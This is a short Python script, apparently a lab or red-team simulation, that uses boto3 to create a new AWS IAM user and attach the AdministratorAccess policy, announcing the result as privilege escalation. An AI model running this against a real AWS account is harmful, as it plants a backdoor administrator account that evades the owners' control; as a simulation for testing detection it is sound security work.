import boto3

def simulate_iam_escalation(user_name):
    iam = boto3.client('iam')

    print(f"[+] Creating a new IAM user: {user_name}")

    # Create user
    iam.create_user(UserName=user_name)

    print("[+] Attaching AdministratorAccess policy...")

    # Attach admin policy (privilege escalation)
    iam.attach_user_policy(
        UserName=user_name,
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )

    print(f"[+] User {user_name} now has ADMIN privileges!")
